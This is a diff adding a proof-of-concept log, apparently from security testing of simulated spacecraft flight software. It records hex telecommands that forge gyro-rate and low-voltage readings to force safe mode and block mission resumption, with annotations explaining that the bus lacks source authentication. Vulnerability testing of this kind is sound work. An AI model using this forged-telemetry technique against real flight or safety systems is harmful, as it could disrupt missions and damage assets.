@@ -1,0 +1,64 @@
+[   0.000] ========================================================================
+[   0.000] V-27 FDIR laundering forged MIDs
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x1D via=radio AES  payload=0a0001
+[   0.000] <-- TM apid=0x1D clear len=4
+[   0.001] --> TC apid=0x1D via=usb AES  payload=00
+[   0.001] <-- TM apid=0x1D clear len=18
+[   0.001] --> TC apid=0x1B via=radio AES  payload=0102840300000000
+[   0.001] <-- TM apid=0x1B clear len=8
+[   0.001] --> advance(3000 ms)
+[   0.001] --> TC apid=0x1D via=usb clear payload=00
+[   0.001] <-- TM apid=0x1D clear len=18
+[   0.001] tilt=8.97 deg/s safe=1 triggers 0->1
+[   0.001] --> TC apid=0x0C via=usb clear payload=-
+[   0.001] <-- TM apid=0x0C clear len=27
+[   0.001] FDIR cannot distinguish forged rate from real gyro data -- no source authentication on the bus feeding the safety loop
+[   0.001] --> TC apid=0x1B via=radio clear payload=01050a
+[   0.001] <-- TM apid=0x1B clear len=8
+[   0.001] --> advance(121000 ms)
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] --> TC apid=0x1B via=radio clear payload=01050a
+[   0.004] <-- TM apid=0x1B clear len=8
+[   0.004] --> TC apid=0x1D via=usb clear payload=03
+[   0.004] <-- TM apid=0x1D clear len=4
+[   0.004] <-- TM apid=0x09 clear len=15
+[   0.004] => attacker controls when the mission resumes: deny release by re-publishing the false low-voltage reading
+[   0.004] ========================================================================
+[   0.004] POC OK
+[   0.004] ========================================================================
